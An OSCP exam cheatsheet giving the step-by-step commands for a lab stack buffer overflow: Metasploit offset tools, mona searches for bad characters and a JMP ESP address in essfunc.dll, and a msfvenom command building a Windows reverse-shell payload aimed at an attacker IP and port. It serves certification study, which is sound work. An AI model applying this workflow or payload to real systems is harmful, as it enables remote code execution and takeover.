
# OSCP-Buffer-Overflow-Cheatsheet
Everything you'll need for the OSCP Buffer Overflow machine
## Cheatsheet

**Pattern Create:** 
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l length_of_pattern

Eg: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
```

**Pattern Offset:** 
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l length_of_pattern -q EIP_value_here

Eg: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 300 -q 39654138
```

**Mona generate hex characters:** 
```
!mona bytearray
```

**Default location of bytearray.bin:** 
```
C:\Program Files (x86)\Immunity Inc\Immunity Debugger\bytearray.bin
```

**Mona compare:** 
```
!mona compare -f bytearray.bin -a esp
``` 
Make sure bytearray.bin has ben generated already.

**List modules with mona:** 
```
!mona modules
```

**Hex equivalent for JMP ESP:** 
```
\xff\xe4
```

**Find JMP ESP statement in identified module:** 
```
!mona find -s "\xff\xe4" -m module_name

Eg: !mona find -s "\xff\xe4" -m essfunc.dll!
```

**Generate shellcode:** 
```
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORt=listener_port EXITFUNC=thread -f c -a x86 -b "bad_characters"

Eg: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.177.128 LPORt=443 EXITFUNC=thread -f c -a x86 -b "\x00\x0a\xb0"
```

**Convert address little endian in python:** 
```
struct.pack("<I", 0xaddress_here)

Eg: struct.pack("<I", 0x080414C3)!
```
Make sure the **struct** library is imported.

### Notes: 
* For python code, some programs may need a newline ("**\n**") character appended at the end in order to process input as intended.
* When identifying bad characters, consider not sending "**\x00**" as it could lead to false positives on other characters.

### Checklist:

1. Host address: 
2. Application port: 
3. Offset: 
4. Badchars: 
5. Vulnerable module:
6. JMP ESP address:
